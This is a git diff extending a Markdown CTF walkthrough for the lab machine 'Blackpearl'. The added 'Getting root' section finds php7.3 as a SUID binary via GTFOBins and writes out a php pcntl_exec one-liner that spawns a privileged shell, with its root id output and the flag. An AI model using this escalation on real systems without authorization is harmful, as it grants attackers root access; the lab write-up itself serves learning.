@@ -322,7 +322,7 @@ navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 1
 ```
 As Heath said **"Navigate to navigate"**
 
-We will see a **Navigate Login ** website
+We will see a **Navigate Login** website
 
 
 ```
@@ -467,6 +467,60 @@ find /: Search starting from the root directory (/).
 ```
 it will also show **/usr/bin/php7.3**
 
+## Getting root !
+
 Now Check for **SUID** in **GTFOBins** and try to find anything realted to the one's we found using the above command 
 
-and yes we found **php**
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/e533e2df7d4cc0ba9152e971ddaafd7f1534e672/Blackpearl/images/Screenshot%202024-08-15%20144301.png)
+
+we found **php**
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/e533e2df7d4cc0ba9152e971ddaafd7f1534e672/Blackpearl/images/Screenshot%202024-08-15%20144329.png)
+
+Click & Scroll down to the **SUID** section
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/e533e2df7d4cc0ba9152e971ddaafd7f1534e672/Blackpearl/images/Screenshot%202024-08-15%20144445.png)
+
+Copy the line of code you see don't execute !
+```
+./php -r "pcntl_exec('/bin/sh', ['-p']);"
+
+./php -r: Runs a PHP script directly from the command line.
+
+"pcntl_exec('/bin/sh', ['-p']);": Uses the pcntl_exec function to execute /bin/sh (a shell) with the -p flag, which may keep privileges.
+
+This is a one liner code to generate a shell
+
+``` 
+
+Now you can use this by going to the location where you found the php7.3
+which is :
+```
+/usr/bin/php7.3 
+```
+```
+/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+```
+And that's it
+```
+# id 
+uid =33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+
+```
+we are **root!**
+```
+# cd /root
+
+# cat flag.txt
+
+Good job on this one
+Finding the domain name may have been a little guessy,
+but the goal of this box is mainly to teach Virtual Host Routing which is used in a lot of CTF
+
+```
+Done ! 
+
+
+```
+2 Down 4 to go
+```
